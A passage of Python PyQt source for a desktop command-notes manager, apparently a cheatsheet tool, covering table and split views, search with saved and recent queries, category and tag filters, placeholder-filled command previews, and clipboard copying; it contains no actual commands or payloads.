            if sub!="All" and sc!=sub:continue
            out.append(n)
        return out
    def _row_note(self,row):
        try:
            it=self.table.item(row,0)
            if not it:return None
            d=it.data(Qt.ItemDataRole.UserRole)
            return d if isinstance(d,dict) else None
        except:return None
    def _do_copy(self,n,raw=False):
        if not n:return
        cmd=n.get("command","") if raw else (self._get_cmd(n) if callable(self._get_cmd) else n.get("command",""))
        if callable(self._on_copy):self._on_copy(cmd,n.get("title",""))
    def _on_cat(self):
        cat=self._sel_text(self.cat)
        keep_sub=self._sel_text(self.sub)
        self._set_list(self.sub,self._subs(cat),keep_sub)
        self._fit_bars()
        self._render()
    def _on_sub(self):
        self._render()
    def _click(self,row,col):
        if col in (self._c_cmd,self._c_copy):
            n=self._row_note(row)
            if n:self._do_copy(n,raw=False)
    def _dbl(self,row,col):
        n=self._row_note(row)
        if n:self._do_copy(n,raw=False)
    def _ctx(self,pos:QPoint):
        ix=self.table.indexAt(pos)
        if not ix.isValid():return
        n=self._row_note(ix.row())
        if not n:return
        m=QMenu(self)
        a1=QAction("Copy Command (Preview)",self);a1.triggered.connect(lambda:self._do_copy(n,raw=False))
        a2=QAction("Copy Raw Command",self);a2.triggered.connect(lambda:self._do_copy(n,raw=True))
        a3=QAction("Copy Title",self);a3.triggered.connect(lambda:(QApplication.clipboard().setText(n.get("title","") or ""),_log("[+]",f"Copied title: {n.get('title','')}")))
        a4=QAction("Copy Category/Sub",self);a4.triggered.connect(lambda:(QApplication.clipboard().setText(f"{n.get('category','')} > {n.get('sub','')}".strip()),_log("[+]",f"Copied path: {n.get('title','')}")))
        m.addAction(a1);m.addAction(a2);m.addSeparator();m.addAction(a3);m.addAction(a4)
        if _norm(n.get("group_name","")):
            a6=QAction("Copy Group",self);a6.triggered.connect(lambda:(QApplication.clipboard().setText(n.get("group_name","") or ""),_log("[+]",f"Copied group: {n.get('group_name','')}")))
            m.addAction(a6)
        if n.get("note_id") is not None:
            a5=QAction("Copy Note ID",self);a5.triggered.connect(lambda:(QApplication.clipboard().setText(str(n.get("note_id"))),_log("[+]",f"Copied note id: {n.get('note_id')}")))
            m.addAction(a5)
        m.exec(self.table.viewport().mapToGlobal(pos))
    _SV_SORT_COLS={0,1,2}
    _SV_HEADERS=["Title","Tags","Command","⧉"]
    def _sort_key_sv(self,n,col):
        if col==0:return _norm(n.get("title","")).lower()
        if col==1:return _norm(n.get("tags","")).lower()
        if col==2:return _norm(n.get("command","")).lower()
        return ""
    def _update_header_labels(self):
        for c,lbl in enumerate(self._SV_HEADERS):
            it=self.table.horizontalHeaderItem(c)
            if it:it.setText(lbl+(" ▲" if self._sort_asc else " ▼") if c==self._sort_col else lbl)
    def _on_header_click(self,col):
        if col not in self._SV_SORT_COLS:return
        if col==self._sort_col:self._sort_asc=not self._sort_asc
        else:self._sort_col=col;self._sort_asc=True
        self._update_header_labels()
        self._render()
    def _render(self):
        rows=self._filtered()
        if self._sort_col in self._SV_SORT_COLS and rows:
            rows=sorted(rows,key=lambda n:self._sort_key_sv(n,self._sort_col),reverse=not self._sort_asc)
        self._update_header_mode(len(rows))
        self.table.setUpdatesEnabled(False)
        try:
            self.table.setRowCount(len(rows))
            for r,n in enumerate(rows):
                cmd_disp=self._get_cmd(n) if callable(self._get_cmd) else n.get("command","")
                preview=_row_preview(n,cmd_disp)
                vals=[_ell(n.get("title",""),120),_ell(n.get("tags",""),80),_ell(cmd_disp,260),"⧉"]
                for c,val in enumerate(vals):
                    it=QTableWidgetItem(val if val is not None else "")
                    it.setFlags(Qt.ItemFlag.ItemIsEnabled|Qt.ItemFlag.ItemIsSelectable)
                    if c==self._c_cmd:it.setToolTip(preview or cmd_disp or "")
                    elif c==self._c_copy:it.setToolTip("Copy")
                    else:it.setToolTip(preview if c==0 else it.text())
                    it.setTextAlignment(Qt.AlignmentFlag.AlignCenter if c in (self._c_tags,self._c_copy) else Qt.AlignmentFlag.AlignVCenter|Qt.AlignmentFlag.AlignLeft)
                    if c==0:it.setText(_ell(_title_text(n),120));it.setData(Qt.ItemDataRole.UserRole,n)
                    self.table.setItem(r,c,it)
            self.table.clearSelection()
        finally:
            self.table.setUpdatesEnabled(True)
    def _fit_bars(self):
        def _w(lst,title):
            fm=QFontMetrics(lst.font());ft=QFontMetrics(title.font())
            mx=ft.horizontalAdvance(_norm(title.text()))
            for i in range(lst.count()):
                t=_norm(lst.item(i).text())
                if t:mx=max(mx,fm.horizontalAdvance(t))
            want=mx+fm.horizontalAdvance("MM")+30
            cap=self._bar_cap
            return min(want,cap),cap
        w1,cap1=_w(self.cat,self.ct);self.cat_f.setMinimumWidth(w1);self.cat_f.setMaximumWidth(cap1)
        w2,cap2=_w(self.sub,self.st);self.sub_f.setMinimumWidth(w2);self.sub_f.setMaximumWidth(cap2)
        sp=getattr(self,"splitter",None)
        if not sp:return
        def _fix():
            try:
                total=sp.size().width()
                if total<=50:
                    QTimer.singleShot(30,_fix);return
                h=sp.handleWidth() or 6
                left=self.cat_f.minimumWidth()
                mid=self.sub_f.minimumWidth()
                right=max(1,total-left-mid-(h*2)-30)
                sp.setSizes([left,mid,right])
                sp.updateGeometry()
                sp.repaint()
                for i in range(1,sp.count()):
                    try:
                        hh=sp.handle(i);hh.update();hh.repaint()
                    except:pass
            except:pass
        QTimer.singleShot(0,_fix)
        QTimer.singleShot(30,_fix)
class LegacyWidget(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent)
        self._db_path=None;self._db_mtime=None;self._notes=[];self._mode="Keyword";self._style="table"
        self._saved=_load_searches();self._applying_saved=False
        self._recent=_load_recent_searches()
        self._meta_groups=[];self._meta_cats=[];self._meta_subs={};self._meta_tags=[]
        self.ctx=LiveTargetContext()
        self.rep=CommandReplacer(self.ctx)
        self._recent_timer=QTimer(self);self._recent_timer.setSingleShot(True);self._recent_timer.setInterval(500);self._recent_timer.timeout.connect(self._remember_recent_search)
        root=QVBoxLayout(self);root.setContentsMargins(0,0,0,0);root.setSpacing(0)
        self.frame=QFrame(self);self.frame.setObjectName("HomeFrame");root.addWidget(self.frame,1)
        v=QVBoxLayout(self.frame);v.setContentsMargins(10,10,10,10);v.setSpacing(10)
        self.top_box=QVBoxLayout();self.top_box.setContentsMargins(14,0,14,0);self.top_box.setSpacing(0)
        self.top_row1=QHBoxLayout();self.top_row1.setSpacing(10)
        self.top_row2=QHBoxLayout();self.top_row2.setSpacing(10)
        self.top_box.addLayout(self.top_row1);self.top_box.addLayout(self.top_row2)
        self.btn_style=QToolButton(self.frame);self.btn_style.setObjectName("HomeAddBtn");self.btn_style.setCursor(Qt.CursorShape.PointingHandCursor);self.btn_style.setPopupMode(QToolButton.ToolButtonPopupMode.InstantPopup)
        self.btn_style.setStyleSheet("QToolButton{text-align:left;padding-right:18px} QToolButton::menu-indicator{image:none;width:0;height:0}")
        m=QMenu(self.btn_style)
        m.setStyleSheet("QMenu{background:#1e1e1e;border:1px solid #2b2b2b;border-radius:12px} QMenu::item{padding:8px 14px} QMenu::item:selected{background:#2b2b2b}")
        a1=QAction("Table",self);a1.triggered.connect(lambda:self._set_style("table",sync=False))
        a2=QAction("Split View",self);a2.triggered.connect(lambda:self._set_style("split",sync=False))
        m.addAction(a1);m.addAction(a2)
        self.btn_style.setMenu(m)
        self.search=QLineEdit(self.frame);self.search.setObjectName("HomeSearch");self.search.setPlaceholderText("Search commands, groups, tags...");self.search.textChanged.connect(self._on_search)
        self.search.setSizePolicy(QSizePolicy.Policy.Expanding,QSizePolicy.Policy.Fixed);self.search.setMinimumWidth(260)
        self.filter=QComboBox(self.frame);self.filter.setObjectName("HomePerPage");self.filter.addItems(["Keyword","Group","Category","Subcategory","Tag","Command"]);self.filter.currentTextChanged.connect(self._on_filter)
        self.filter.currentTextChanged.connect(lambda *_:_sync_combo_tooltips(self.filter))
        self.btn_clear=QToolButton(self.frame);self.btn_clear.setObjectName("HomeAddBtn");self.btn_clear.setCursor(Qt.CursorShape.PointingHandCursor);self.btn_clear.setText("Clear Search");self.btn_clear.clicked.connect(self._clear)
        self.btn_clear.setStyleSheet("QToolButton{text-align:center} QToolButton::menu-indicator{image:none;width:0;height:0}")
        self.btn_adv=QToolButton(self.frame);self.btn_adv.setObjectName("HomeAddBtn");self.btn_adv.setCursor(Qt.CursorShape.PointingHandCursor);self.btn_adv.clicked.connect(self._toggle_advanced_filters)
        self._top_compact=None;self._top_narrow=None
        self._layout_top(True,False)
        v.addLayout(self.top_box,0)
        self.filt_box=QVBoxLayout();self.filt_box.setContentsMargins(14,0,14,0);self.filt_box.setSpacing(6)
        self.filt_row1=QHBoxLayout();self.filt_row1.setSpacing(10)
        self.adv_wrap=QFrame(self.frame);self.adv_wrap.setObjectName("SearchAdvancedWrap");self.adv_wrap.setSizePolicy(QSizePolicy.Policy.Expanding,QSizePolicy.Policy.Fixed)
        self.adv_box=QVBoxLayout(self.adv_wrap);self.adv_box.setContentsMargins(0,0,0,0);self.adv_box.setSpacing(6)
        self.filt_row2=QHBoxLayout();self.filt_row2.setSpacing(10)
        self.filt_row3=QHBoxLayout();self.filt_row3.setSpacing(10)
        self.filt_box.addLayout(self.filt_row1);self.adv_box.addLayout(self.filt_row2);self.adv_box.addLayout(self.filt_row3);self.filt_box.addWidget(self.adv_wrap,0)
        self.lbl_saved=QLabel("Saved",self.frame)
        self.cmb_saved=QComboBox(self.frame);self.cmb_saved.setObjectName("HomePerPage")
        self.lbl_recent=QLabel("Recent",self.frame)
        self.cmb_recent=QComboBox(self.frame);self.cmb_recent.setObjectName("HomePerPage")
        self.btn_save=QToolButton(self.frame);self.btn_save.setObjectName("HomeAddBtn");self.btn_save.setText("Save")
        self.btn_del=QToolButton(self.frame);self.btn_del.setObjectName("HomeAddBtn");self.btn_del.setText("Delete")
        self.lbl_src=QLabel("Source",self.frame)
        self.cmb_src=QComboBox(self.frame);self.cmb_src.setObjectName("HomePerPage");self.cmb_src.addItems(["All","Linked","Not Linked"])
        self.lbl_group=QLabel("Group",self.frame)
        self.cmb_group=QComboBox(self.frame);self.cmb_group.setObjectName("HomePerPage")
        self.lbl_cat=QLabel("Category",self.frame)
        self.cmb_cat=QComboBox(self.frame);self.cmb_cat.setObjectName("HomePerPage")
        self.lbl_sub=QLabel("Sub",self.frame)
        self.cmb_sub=QComboBox(self.frame);self.cmb_sub.setObjectName("HomePerPage")
        self.lbl_tag=QLabel("Tag",self.frame)
        self.cmb_tag=QComboBox(self.frame);self.cmb_tag.setObjectName("HomePerPage")
        self.btn_clear_filters=QToolButton(self.frame);self.btn_clear_filters.setObjectName("HomeAddBtn");self.btn_clear_filters.setText("Clear Filters");self.btn_clear_filters.clicked.connect(self._clear_filters)
        self.btn_save.clicked.connect(self._save_search)
        self.btn_del.clicked.connect(self._delete_search)
        self.cmb_saved.currentIndexChanged.connect(self._on_saved_select)
        self.cmb_recent.currentIndexChanged.connect(self._on_recent_select)
        self.cmb_src.currentTextChanged.connect(self._on_filter_change)
        self.cmb_group.currentTextChanged.connect(self._on_filter_change)
        self.cmb_cat.currentTextChanged.connect(self._on_cat_filter)
        self.cmb_sub.currentTextChanged.connect(self._on_filter_change)
        self.cmb_tag.currentTextChanged.connect(self._on_filter_change)
        for combo in (self.cmb_saved,self.cmb_recent,self.cmb_src,self.cmb_group,self.cmb_cat,self.cmb_sub,self.cmb_tag):
            combo.currentTextChanged.connect(lambda *_,c=combo:_sync_combo_tooltips(c))
        self._filters_compact=None
        self._advanced_visible=False
        self._sync_advanced_button()
        self._layout_filters(3)
        self._apply_advanced_visibility()
        v.addLayout(self.filt_box,0)
        self.stack=QStackedWidget(self.frame);self.stack.setObjectName("Stack");self.stack.setSizePolicy(QSizePolicy.Policy.Expanding,QSizePolicy.Policy.Expanding);v.addWidget(self.stack,1)
        self.table_style=Table_Style(self._copy,self._cmd_preview,self.stack)
        self.split_style=Split_View_Style(self._copy,self._cmd_preview,self.stack)
        self.stack.addWidget(self.table_style);self.stack.addWidget(self.split_style)
        self._fit_top();self._refresh_saved_combo();self._refresh_recent_combo()
        self._set_style("table",sync=False)
        QTimer.singleShot(0,self.reload)
        self.t=QTimer(self);self.t.setInterval(900);self.t.timeout.connect(self._tick);self.t.start()
        _log("[+]",f"SearchCore ready")
    def _clear_layout(self,lay):
        while lay.count():
            it=lay.takeAt(0)
            w=it.widget()
            if w:w.setParent(None)
    def _set_advanced_visible(self,visible):
        try:self.adv_wrap.setVisible(bool(visible))
        except Exception:pass
    def _apply_advanced_visibility(self):
        vis=bool(self._advanced_visible)
        self._set_advanced_visible(vis)
        try:
            self.adv_wrap.setMaximumHeight(16777215 if vis else 0)
            self.adv_wrap.setMinimumHeight(0)
            self.adv_wrap.setVisible(vis)
            self.filt_box.setSpacing(6 if vis else 2)
            self.adv_wrap.updateGeometry();self.filt_row2.invalidate();self.filt_row3.invalidate();self.filt_box.invalidate()
            self.frame.updateGeometry();self.updateGeometry();self.update()
        except Exception:pass
    def _sync_advanced_button(self):
        try:self.btn_adv.setText("Hide Advanced Filters" if self._advanced_visible else "Show Advanced Filters")
        except Exception:pass
    def _layout_top(self,compact,narrow):
        if getattr(self,"_top_compact",None)==compact and getattr(self,"_top_narrow",None)==narrow:return
        self._top_compact=compact;self._top_narrow=narrow
        self._clear_layout(self.top_row1);self._clear_layout(self.top_row2)
        self.top_box.setSpacing(6 if compact else 0)
        if narrow:
            self.top_row1.addWidget(self.btn_style,0)
            self.top_row1.addWidget(self.search,1)
            self.top_row2.addWidget(self.filter,0)
            self.top_row2.addWidget(self.btn_clear,0)
            self.top_row2.addWidget(self.btn_adv,0)
            self.top_row2.addStretch(1)
            return
        self.top_row1.addWidget(self.btn_style,0)
        self.top_row1.addWidget(self.search,1)
        self.top_row1.addWidget(self.filter,0)
        self.top_row1.addWidget(self.btn_clear,0)
        self.top_row1.addWidget(self.btn_adv,0)
        self.top_row1.addStretch(1)
    def _layout_filters(self,mode):
        if getattr(self,"_filters_compact",None)==mode:return
        self._filters_compact=mode
        self._clear_layout(self.filt_row1)
        self._clear_layout(self.filt_row2)
        self._clear_layout(self.filt_row3)
        self.filt_row1.addWidget(self.lbl_saved,0)
        self.filt_row1.addWidget(self.cmb_saved,0)
        self.filt_row1.addWidget(self.lbl_recent,0)
        self.filt_row1.addWidget(self.cmb_recent,0)
        self.filt_row1.addWidget(self.btn_save,0)
        self.filt_row1.addWidget(self.btn_del,0)
        self.filt_row1.addStretch(1)
        if mode==3:
            self.filt_row2.addWidget(self.lbl_src,0)
            self.filt_row2.addWidget(self.cmb_src,0)
            self.filt_row2.addWidget(self.lbl_group,0)
            self.filt_row2.addWidget(self.cmb_group,0)
            self.filt_row2.addWidget(self.lbl_cat,0)
            self.filt_row2.addWidget(self.cmb_cat,0)
            self.filt_row2.addStretch(1)
            self.filt_row3.addWidget(self.lbl_sub,0)
            self.filt_row3.addWidget(self.cmb_sub,0)
            self.filt_row3.addWidget(self.lbl_tag,0)
            self.filt_row3.addWidget(self.cmb_tag,0)
            self.filt_row3.addWidget(self.btn_clear_filters,0)
            self.filt_row3.addStretch(1)
            return
        self.filt_row2.addWidget(self.lbl_src,0)
        self.filt_row2.addWidget(self.cmb_src,0)
        self.filt_row2.addWidget(self.lbl_group,0)
        self.filt_row2.addWidget(self.cmb_group,0)
        self.filt_row2.addWidget(self.lbl_cat,0)
        self.filt_row2.addWidget(self.cmb_cat,0)
        self.filt_row2.addWidget(self.lbl_sub,0)
        self.filt_row2.addWidget(self.cmb_sub,0)
        self.filt_row2.addWidget(self.lbl_tag,0)
        self.filt_row2.addWidget(self.cmb_tag,0)
        self.filt_row2.addWidget(self.btn_clear_filters,0)
        self.filt_row2.addStretch(1)
    def _fit_top(self):
        h=30
        for w in (self.btn_style,self.search,self.filter,self.btn_clear,self.btn_adv,self.cmb_saved,self.cmb_recent,self.cmb_src,self.cmb_group,self.cmb_cat,self.cmb_sub,self.cmb_tag,self.btn_save,self.btn_del,self.btn_clear_filters):w.setFixedHeight(h)
        for w in (self.lbl_saved,self.lbl_recent,self.lbl_src,self.lbl_group,self.lbl_cat,self.lbl_sub,self.lbl_tag):w.setFixedHeight(h)
        width=self.frame.width() if self.frame.width()>0 else self.width()
        compact=True
        narrow=width<1050
        fm_btn=QFontMetrics(self.btn_style.font())
        bw=max(fm_btn.horizontalAdvance(s+"  ▼") for s in ("Table","Split View"))+60
        if bw<180:bw=180
        self.btn_style.setFixedWidth(bw)
        _fit_combo_width(self.filter,110,150)
        fm_clr=QFontMetrics(self.btn_clear.font());self.btn_clear.setFixedWidth(fm_clr.horizontalAdvance("Clear Search")+28)
        fm_adv=QFontMetrics(self.btn_adv.font());self.btn_adv.setFixedWidth(fm_adv.horizontalAdvance(_norm(self.btn_adv.text()) or "Show Advanced Filters")+30)
        self.search.setMinimumWidth(150 if narrow else 200)
        _fit_combo_width(self.cmb_saved,110 if narrow else 120,170 if narrow else 210)
        _fit_combo_width(self.cmb_recent,120 if narrow else 140,220 if narrow else 280)
        _fit_combo_width(self.cmb_src,85 if narrow else 90,120)
        _fit_combo_width(self.cmb_group,95 if narrow else 110,150 if narrow else 190)
        _fit_combo_width(self.cmb_cat,100 if narrow else 120,160 if narrow else 190)
        _fit_combo_width(self.cmb_sub,100 if narrow else 120,160 if narrow else 190)
        _fit_combo_width(self.cmb_tag,85 if narrow else 90,130 if narrow else 170)
        fm_act=QFontMetrics(self.btn_save.font())
        pad=34 if compact else 40
        self.btn_save.setFixedWidth(fm_act.horizontalAdvance("Save")+pad)
        self.btn_del.setFixedWidth(fm_act.horizontalAdvance("Delete")+pad)
        self.btn_clear_filters.setFixedWidth(fm_act.horizontalAdvance("Clear Filters")+pad)
        self._layout_top(True,narrow)
        self._layout_filters(3 if narrow else 2)
    def resizeEvent(self,e):
        try:super().resizeEvent(e)
        except:pass
        try:self._fit_top()
        except:pass
    def _refresh_saved_combo(self,select_name=None):
        self.cmb_saved.blockSignals(True)
        self.cmb_saved.clear()
        self.cmb_saved.addItem("Saved searches")
        for s in (self._saved or []):
            name=_norm(s.get("name",""))
            if not name:continue
            self.cmb_saved.addItem(name)
            self.cmb_saved.setItemData(self.cmb_saved.count()-1,s)
        if select_name:
            sel=_l(select_name)
            for i in range(self.cmb_saved.count()):
                if _l(self.cmb_saved.itemText(i))==sel:
                    self.cmb_saved.setCurrentIndex(i)
                    break
        self.cmb_saved.blockSignals(False)
        _sync_combo_tooltips(self.cmb_saved)
        self._fit_top()
    def _refresh_recent_combo(self):
        self.cmb_recent.blockSignals(True)
        self.cmb_recent.clear()
        self.cmb_recent.addItem("Recent searches")
        for s in (self._recent or []):
            self.cmb_recent.addItem(_recent_entry_label(s))
            self.cmb_recent.setItemData(self.cmb_recent.count()-1,s)
        self.cmb_recent.blockSignals(False)
        _sync_combo_tooltips(self.cmb_recent)
        self._fit_top()
    def _clear_saved_selection(self):
        if self.cmb_saved.currentIndex()!=0:
            self.cmb_saved.blockSignals(True)
            self.cmb_saved.setCurrentIndex(0)
            self.cmb_saved.blockSignals(False)
    def _clear_recent_selection(self):
        if self.cmb_recent.currentIndex()!=0:
            self.cmb_recent.blockSignals(True)
            self.cmb_recent.setCurrentIndex(0)
            self.cmb_recent.blockSignals(False)
    def _set_combo_value(self,combo,val):
        v=_norm(val) or "All"
        idx=combo.findText(v,Qt.MatchFlag.MatchFixedString)
        if idx<0:
            lv=_l(v)
            for i in range(combo.count()):
                if _l(combo.itemText(i))==lv:
                    idx=i;break
        combo.setCurrentIndex(idx if idx>=0 else 0)
    def _set_combo_items(self,combo,items,keep):
        combo.blockSignals(True)
        combo.clear()
        combo.addItem("All")
        for x in items or []:combo.addItem(x)
        self._set_combo_value(combo,keep)
        combo.blockSignals(False)
        _sync_combo_tooltips(combo)
    def _collect_meta(self):
        groups=set();cats=set();subs={};tags=set()
        for n in (self._notes or []):
            g=_norm(n.get("group_name",""))
            if g:groups.add(g)
            c=_norm(n.get("category","")) or "Uncategorized"
            sc=_norm(n.get("sub","")) or "General"
            cats.add(c);subs.setdefault(c,set()).add(sc)
            for t in _split_tags(n.get("tags","")):tags.add(t)
        self._meta_groups=sorted(list(groups),key=lambda x:x.lower())
        self._meta_cats=sorted(list(cats),key=lambda x:x.lower())
        self._meta_subs={k:sorted(list(v),key=lambda x:x.lower()) for k,v in subs.items()}
        self._meta_tags=sorted(list(tags),key=lambda x:x.lower())
    def _refresh_sub_combo(self,keep):
        cat=_norm(self.cmb_cat.currentText()) or "All"
        if cat=="All":
            all_subs=set()
            for v in self._meta_subs.values():all_subs.update(v)
            items=sorted(list(all_subs),key=lambda x:x.lower())
        else:
            items=self._meta_subs.get(cat,[])
        self._set_combo_items(self.cmb_sub,items,keep)
    def _refresh_filter_options(self):
        keep_group=_norm(self.cmb_group.currentText())
        keep_cat=_norm(self.cmb_cat.currentText())
        keep_sub=_norm(self.cmb_sub.currentText())
        keep_tag=_norm(self.cmb_tag.currentText())
        self._collect_meta()
        self._set_combo_items(self.cmb_group,self._meta_groups,keep_group)
        self._set_combo_items(self.cmb_cat,self._meta_cats,keep_cat)
        self._refresh_sub_combo(keep_sub)
        self._set_combo_items(self.cmb_tag,self._meta_tags,keep_tag)
        self._fit_top()
    def _current_filters(self):
        return {"src":self.cmb_src.currentText(),"group":self.cmb_group.currentText(),"category":self.cmb_cat.currentText(),"sub":self.cmb_sub.currentText(),"tag":self.cmb_tag.currentText()}
    def _current_search_entry(self,name):
        entry=_normalize_search_entry({"name":_norm(name),"query":self.search.text(),"mode":self._mode,"filters":self._current_filters(),"captured_at":datetime.now(timezone.utc).isoformat()})
        if not _norm(name):entry.pop("name",None)
        return entry
    def _apply_entry(self,data,from_recent=False):
        if not isinstance(data,dict):return
        self._applying_saved=True
        try:
            self.search.setText(data.get("query",""))
            self.filter.setCurrentText(data.get("mode","Keyword"))
            flt=data.get("filters",{}) if isinstance(data.get("filters",{}),dict) else {}
            self._set_combo_value(self.cmb_src,flt.get("src","All"))
            self._set_combo_value(self.cmb_group,flt.get("group","All"))
            self._set_combo_value(self.cmb_cat,flt.get("category","All"))
            self._refresh_sub_combo(flt.get("sub","All"))
            self._set_combo_value(self.cmb_tag,flt.get("tag","All"))
        finally:
            self._applying_saved=False
        if from_recent:self._clear_saved_selection()
        else:self._clear_recent_selection()
        self._apply_query()
    def _on_saved_select(self,idx):
        if idx<=0:return
        data=self.cmb_saved.itemData(idx)
        self._apply_entry(data,from_recent=False)
        self._store_recent_entry(data)
    def _on_recent_select(self,idx):
        if idx<=0:return
        data=self.cmb_recent.itemData(idx)
        self._apply_entry(data,from_recent=True)
        self._store_recent_entry(data)
    def _has_meaningful_search(self,entry):
        data=_normalize_search_entry(entry)
        if _norm(data.get("query","")):return True
        if _norm(data.get("mode","Keyword"))!="Keyword":return True
        for v in _norm_filters(data.get("filters",{})).values():
            if _norm(v) and _norm(v)!="All":return True
        return False
    def _store_recent_entry(self,entry):
        data=_normalize_search_entry(entry);data["captured_at"]=datetime.now(timezone.utc).isoformat()
        if not self._has_meaningful_search(data):return
        sig=_entry_signature(data)
        rows=[data]
        for it in (self._recent or []):
            if _entry_signature(it)==sig:continue
            rows.append(_normalize_search_entry(it))
        self._recent=rows[:20]
        _save_recent_searches(self._recent)
        self._refresh_recent_combo()
    def _schedule_recent_save(self):
        if self._applying_saved:return
        try:self._recent_timer.start()
        except Exception:pass
    def _remember_recent_search(self):
        self._store_recent_entry(self._current_search_entry(""))
    def _save_search(self):
        name,ok=QInputDialog.getText(self,"Save Search","Name")
        if not ok:return
        name=_norm(name)
        if not name:return
        entry=self._current_search_entry(name)
        idx=None
        for i,s in enumerate(self._saved or []):
            if _l(s.get("name",""))==_l(name):idx=i;break
        if idx is not None:
            if QMessageBox.question(self,"Save Search",f"Overwrite saved search: {name}?",QMessageBox.StandardButton.Yes|QMessageBox.StandardButton.No)!=QMessageBox.StandardButton.Yes:return
            self._saved[idx]=entry
        else:
            self._saved.append(entry)
        _save_searches(self._saved)
        self._refresh_saved_combo(select_name=name)
    def _delete_search(self):
        idx=self.cmb_saved.currentIndex()
        if idx<=0:return
        name=self.cmb_saved.itemText(idx)
        if QMessageBox.question(self,"Delete Search",f"Delete saved search: {name}?",QMessageBox.StandardButton.Yes|QMessageBox.StandardButton.No)!=QMessageBox.StandardButton.Yes:return
        self._saved=[s for s in (self._saved or []) if _l(s.get("name",""))!=_l(name)]
        _save_searches(self._saved)
        self._refresh_saved_combo()
    def _on_filter_change(self,*_):
        if not self._applying_saved:self._clear_saved_selection();self._clear_recent_selection()
        self._apply_query()
        self._schedule_recent_save()
    def _on_cat_filter(self,*_):
        keep=_norm(self.cmb_sub.currentText())
        self._refresh_sub_combo(keep)
        if not self._applying_saved:self._clear_saved_selection();self._clear_recent_selection()
        self._apply_query()
        self._schedule_recent_save()
    def _cmd_preview(self,n):
        if not n:return ""
        return self.rep.apply(n.get("command",""))
    def reload(self):
        self._db_path,self._notes=_load_cmds(self._db_path)
        self._db_mtime=_safe_mtime(self._db_path)
        self.table_style.set_notes(self._notes,apply=False)
        self.split_style.set_notes(self._notes,apply=False)
        self._refresh_filter_options()
        self._apply_query()
    def _tick(self):
        p=_db_path()
        mt=_safe_mtime(p)
        if p!=self._db_path or mt!=self._db_mtime:
            self.reload()
            return
        if self.ctx.changed():
            self.ctx.reload()
            if self._style=="split":
                self.split_style.refresh_view()
            else:
                self.table_style.refresh_view()
            return
    def _apply_query(self,style=None):
        q=self.search.text()
        flt=self._current_filters()
        use=(style or self._style) or "table"
        if use=="split":
            self.split_style.set_filters(flt.get("src"),flt.get("group"),flt.get("category"),flt.get("sub"),flt.get("tag"),apply=False)
            self.split_style.set_query(q,self._mode)
        else:
            self.table_style.set_filters(flt.get("src"),flt.get("group"),flt.get("category"),flt.get("sub"),flt.get("tag"),apply=False)
            self.table_style.set_query(q,self._mode)
    def _copy(self,cmd,title=""):
        try:
            QApplication.clipboard().setText(cmd or "")
            _log("[+]",f"Copied: {title}")
        except Exception as e:
            _log("[!]",f"Clipboard error ({e})")
    def _toggle_advanced_filters(self):
        self._advanced_visible=not bool(getattr(self,"_advanced_visible",False))
        self._sync_advanced_button()
        try:
            fm_adv=QFontMetrics(self.btn_adv.font())
            self.btn_adv.setFixedWidth(fm_adv.horizontalAdvance(_norm(self.btn_adv.text()) or "Show Advanced Filters")+30)
        except Exception:pass
        self._apply_advanced_visibility()
    def _clear_filters(self):
        self._applying_saved=True
        try:
            self._set_combo_value(self.cmb_src,"All")
            self._set_combo_value(self.cmb_group,"All")
            self._set_combo_value(self.cmb_cat,"All")
            self._refresh_sub_combo("All")
            self._set_combo_value(self.cmb_tag,"All")
            self._clear_saved_selection()
            self._clear_recent_selection()
        finally:
            self._applying_saved=False
        self._apply_query()
        self._schedule_recent_save()
    def _open_mini(self):
        try:
            w=self.window()
        except Exception:
            return
        if w and hasattr(w,"open_mini"):
            try:w.open_mini()
            except Exception:pass
    def _clear(self):
        self._applying_saved=True
        try:
            self.search.blockSignals(True);self.search.setText("");self.search.blockSignals(False)
            self._clear_saved_selection()
            self._clear_recent_selection()
        finally:
            self._applying_saved=False
        try:self._recent_timer.stop()
        except Exception:pass
        self._apply_query()
    def _on_search(self,t):
        if not self._applying_saved:self._clear_saved_selection();self._clear_recent_selection()
        self._apply_query()
        self._schedule_recent_save()
    def _on_filter(self,t):
        self._mode=t or "Keyword"
        if not self._applying_saved:self._clear_saved_selection();self._clear_recent_selection()
        self._apply_query()
        self._schedule_recent_save()
    def _set_style(self,style,sync=True):
        self._style="split" if style=="split" else "table"
        label="Split View" if self._style=="split" else "Table"
        try:self.btn_style.setText(f"{label}  ▼")
        except:pass
        self.stack.setCurrentIndex(1 if self._style=="split" else 0)
        if self._style=="split":
            QTimer.singleShot(0,self.split_style._fit_bars)
            QTimer.singleShot(30,self.split_style._fit_bars)
        _log("[*]",f"Style: {self._style}")
        if sync:self._apply_query()
class SnippetPanelPreviewWidget(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent)
        self._items=self._seed_items();self._view=[];self._collection="All";self._selected_id=None
        root=QVBoxLayout(self);root.setContentsMargins(0,0,0,0);root.setSpacing(0)
        self.frame=QFrame(self);self.frame.setObjectName("SnippetPage");root.addWidget(self.frame,1)
        v=QVBoxLayout(self.frame);v.setContentsMargins(10,10,10,10);v.setSpacing(10)
        top=QHBoxLayout();top.setContentsMargins(4,0,4,0);top.setSpacing(10)
        self.search=QLineEdit(self.frame);self.search.setObjectName("HomeSearch");self.search.setPlaceholderText("Search snippets, commands, tags, notes...")
        self.cmb_scope=QComboBox(self.frame);self.cmb_scope.setObjectName("HomePerPage");self.cmb_scope.addItems(["Everything","Title","Command","Tags","Category"])
        self.cmb_state=QComboBox(self.frame);self.cmb_state.setObjectName("HomePerPage");self.cmb_state.addItems(["All","Linked","Standalone","Has Placeholder","Missing Value"])
        self.btn_view_list=self._btn("List",check=True);self.btn_view_table=self._btn("Table",check=True);self.btn_view_list.setChecked(True)
        top.addWidget(self.search,1);top.addWidget(self.cmb_scope,0);top.addWidget(self.cmb_state,0);top.addWidget(self.btn_view_list,0);top.addWidget(self.btn_view_table,0)
        v.addLayout(top,0)
        self.split=QSplitter(Qt.Orientation.Horizontal,self.frame);self.split.setObjectName("SnippetSplit");self.split.setHandleWidth(0);self.split.setChildrenCollapsible(False)
        v.addWidget(self.split,1)
        self.side=QFrame(self.split);self.side.setObjectName("SnippetSide")
        sv=QVBoxLayout(self.side);sv.setContentsMargins(10,10,10,10);sv.setSpacing(8)
        sv.addWidget(self._label("Collections","SnippetSection"),0)
        self.collection_buttons=[]
        for name in ("All","Pinned","Recent","Most Used","Linked","Standalone","Missing Values"):
            b=self._btn(name,check=True);b.clicked.connect(lambda chk=False,n=name:self._set_collection(n));self.collection_buttons.append(b);sv.addWidget(b,0)
